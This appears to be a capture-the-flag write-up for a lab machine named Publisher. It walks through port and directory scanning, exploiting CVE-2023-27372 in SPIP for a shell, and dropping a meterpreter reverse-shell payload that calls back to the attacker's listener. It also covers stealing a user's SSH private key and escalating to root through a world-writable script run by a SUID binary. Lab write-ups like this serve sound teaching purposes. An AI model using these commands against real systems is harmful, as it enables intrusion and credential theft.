# Publisher

## Enumeration

### NMAP

```sh
nmap -oX nmap/publisher_initial $TARGET
```

```
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-29 18:39 EDT
Nmap scan report for 10.10.141.134
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.95 seconds
```

```sh
nmap -sC -sV -p22,80 -oX nmap/publisher_open $TARGET
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
```

### Gobuster

```sh
gobuster dir -u http://$TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 50 -o gobuster/initial
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.141.134
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.10.141.134/images/]
/server-status        (Status: 403) [Size: 278]
/spip                 (Status: 301) [Size: 313] [--> http://10.10.141.134/spip/]
Progress: 20597 / 56165 (36.67%)[ERROR] parse "http://10.10.141.134/error\x1f_log": net/url: invalid control character in URL
Progress: 56164 / 56165 (100.00%)
===============================================================
Finished
===============================================================
```

- SPIP route discovered. There may be a vulnerability.
- Found SPIP RCE vulnerability on [github](https://github.com/Chocapikk/CVE-2023-27372)

## Exploit

Can exploit `CVE-2023-27372` using the referenced python script to get an unstable shell on the target.

Once an unstable shell is achieved, generate an metasploit payload using `msfvenom -p linux/x64/meterpreter/reverse_tcp -a x64 --platform linux -f elf -o revshell LHOST=<yourip> LPORT=<yourport>`.
Base64 encode the shell using `baes64 revshell` and make base64 all one line.

(On Attacker)
```
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost <yourip>
let lport <yourport>
run
```

(On Shell) 
```
echo <base64 from above> | base64 -d > revshell
chmod +x revshell
./revshell
```

After meterpreter session is achieved, you can read the user flag from `/home/think/user.txt`.

To gain a stable foothold, you can download `/home/think/.ssh/id_rsa` and ssh in using `ssh -i id_rsa think@$TARGET`. (note: remember to `chmod 600 id_rsa` after download).

After getting SSH access to the machine, upload the meterpreter payload to `/dev/shm` using the `echo <b64> | base64 -d > /dev/shm/rev` technique and open a meterpreter payload for more access. (_note: I was having permissions issues in the PrivEsc portion using only the SSH shell. the meterpreter session granted  more access_)

## PrivEsc

Running `find / -type f -perm /06000 2>/dev/null` reveals a strange binary named `/usr/sbin/run_container`. 

Running `strings /usr/sbin/run_container` shows that it is executing `/opt/run_container.sh`.

Looking at `/opt/run_container.sh` by running `ls -ali /opt/run_container.sh` shows `777` permissions on the file meaning anyone can overwrite it.

New `/opt/run_container.sh`:

```bash
#!/bin/bash
/dev/shm/rev &
```

_note: make the malicious `run_container.sh` script on your local machine and upload it to `/dev/shm` using meterpreter, then `cp /dev/shm/mal.sh /opt/run_container.sh`._

Make sure there is a meterpreter listener running, then run `execute -f /usr/sbin/run_container` (meterpreter) or `/usr/sbin/run_container` (ssh shell) to get a root meterpreter session.

The flag is located at `/root/root.txt`.
